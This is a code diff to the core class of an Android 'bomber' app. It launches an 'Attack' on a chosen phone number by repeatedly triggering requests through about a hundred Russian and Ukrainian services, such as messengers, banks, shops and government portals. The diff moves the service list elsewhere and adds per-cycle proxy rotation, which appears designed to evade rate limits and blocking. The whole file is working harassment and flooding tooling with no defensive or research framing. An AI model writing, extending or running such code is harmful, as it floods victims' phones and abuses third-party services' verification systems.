@@ -2,49 +2,23 @@ package com.dm.bomber.bomber;
 
 import android.util.Log;
 
-import com.dm.bomber.services.*;
+import com.dm.bomber.services.Service;
+import com.dm.bomber.services.Services;
 
 import org.jetbrains.annotations.NotNull;
 
+import java.net.Proxy;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.CountDownLatch;
 
 import okhttp3.Call;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
 import okhttp3.Response;
 
 public class Bomber {
     private static final String TAG = "Bomber";
-    private static final Service[] services = new Service[]{
-            new GloriaJeans(), new Telegram(), new MTS(), new CarSmile(),
-            new Eldorado(), new Tele2TV(), new MegafonTV(), new YotaTV(),
-            new Ukrzoloto(), new Olltv(), new Wink(), new ProstoTV(),
-            new Zdravcity(), new Robocredit(), new Tinder(), new Groshivsim(),
-            new Hoff(), new Dolyame(), new Gorparkovka(), new Tinkoff(),
-            new MegaDisk(), new KazanExpress(), new FoodBand(), new Gosuslugi(),
-            new Citimobil(), new HHru(), new TikTok(), new Multiplex(),
-            new Ozon(), new MFC(), new EKA(), new OK(), new MBK(),
-            new VKWorki(), new Magnit(), new SberZvuk(), new Smotrim(),
-            new BApteka(), new HiceBank(), new Evotor(), new Sportmaster(),
-            new GoldApple(), new FriendsClub(), new ChestnyZnak(),
-            new MoeZdorovie(), new Sokolov(), new Boxberry(), new Discord(),
-            new NearKitchen(), new Citydrive(), new Metro(), new RabotaRu(),
-            new Mozen(), new MosMetro(), new BCS(), new Dostavista(),
-            new Mokka(), new Stolichki(), new Mirkorma(), new TochkaBank(),
-            new Uchiru(), new Biua(), new MdFashion(), new RiveGauche(),
-            new XtraTV(), new AlloUa(), new Rulybka(), new Velobike(),
-            new Technopark(), new Call2Friends(), new Ievaphone(), new WebCom(),
-            new MTSBank(), new ATB(), new Paygram(), new Tele2(),
-            new SravniMobile(), new TeaRU(), new PetStory(), new Profi(),
-            new BeriZaryad(), new PrivetMir(), new CardsMobile(), new Labirint(),
-            new CallMyPhone(), new SberMobile(), new YandexTips(), new Meloman(),
-            new Choco(), new AptekaOtSklada(), new Dodopizza(), new AutoRu(),
-            new SatUa(), new VapeZone(), new TakeEat(), new BibiSushi(),
-            new Melzdrav(), new Fonbet(), new Stroyudacha(), new Grilnica(),
-            new Trapezapizza(), new Aitu(), new Pizzaman(), new VSK(),
-            new Soscredit(), new ChernovtsyRabota(), new Eva(), new Apteka(),
-            new Kari(), new Modulebank()
-    };
 
     public static boolean isAlive(Attack attack) {
         return attack != null && attack.isAlive();
@@ -53,7 +27,7 @@ public class Bomber {
     public static List<Service> getUsableServices(String phoneCode) {
         List<Service> usableServices = new ArrayList<>();
 
-        for (Service service : services) {
+        for (Service service : Services.services) {
             if (service.requireCode == null || service.requireCode.equals(phoneCode) || phoneCode.isEmpty())
                 usableServices.add(service);
         }
@@ -66,17 +40,19 @@ public class Bomber {
         private final String phoneCode;
         private final String phone;
         private final int numberOfCycles;
+        private final List<Proxy> proxies;
 
         private int progress = 0;
 
         private CountDownLatch tasks;
 
-        public Attack(com.dm.bomber.bomber.Callback callback, String phoneCode, String phone, int cycles) {
+        public Attack(com.dm.bomber.bomber.Callback callback, String phoneCode, String phone, int cycles, List<Proxy> proxies) {
             super(phone);
 
             this.phoneCode = phoneCode;
             this.phone = phone;
             this.callback = callback;
+            this.proxies = proxies;
 
             numberOfCycles = cycles;
         }
@@ -88,25 +64,35 @@ public class Bomber {
             callback.onAttackStart(usableServices.size(), numberOfCycles);
             Log.i(TAG, String.format("Starting attack on +%s%s", phoneCode, phone));
 
+            OkHttpClient.Builder clientBuilder = new OkHttpClient.Builder()
+                    .addInterceptor(chain -> {
+                        Request request = chain.request();
+                        Log.v(TAG, String.format("Sending request %s", request.url()));
+
+                        Response response = chain.proceed(request);
+                        Log.v(TAG, String.format("Received response for %s with status code %s",
+                                response.request().url(), response.code()));
+
+                        return response;
+                    });
+
             try {
                 for (int cycle = 0; cycle < numberOfCycles; cycle++) {
-                    Log.i(TAG, String.format("Started cycle %s", cycle));
+                    if (!proxies.isEmpty())
+                        clientBuilder.proxy(proxies.get(cycle % proxies.size()));
 
+                    OkHttpClient client = clientBuilder.build();
+
+                    Log.i(TAG, String.format("Started cycle %s", cycle));
                     tasks = new CountDownLatch(usableServices.size());
 
                     for (Service service : usableServices) {
                         service.prepare(phoneCode, phone);
-                        service.run(new com.dm.bomber.services.Callback() {
-                            @Override
-                            public void onSuccess() {
-                                tasks.countDown();
-                                callback.onProgressChange(progress++);
-                            }
-
+                        service.run(client, new com.dm.bomber.services.Callback() {
                             @Override
                             public void onError(Exception e) {
                                 Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);
-                                onSuccess();
+                                tasks.countDown();
                             }
 
                             @Override
@@ -115,7 +101,9 @@ public class Bomber {
                                     Log.i(TAG, String.format("%s returned an error HTTP code: %s",
                                             service.getClass().getName(), response.code()));
                                 }
-                                onSuccess();
+
+                                tasks.countDown();
+                                callback.onProgressChange(progress++);
                             }
                         });
                     }
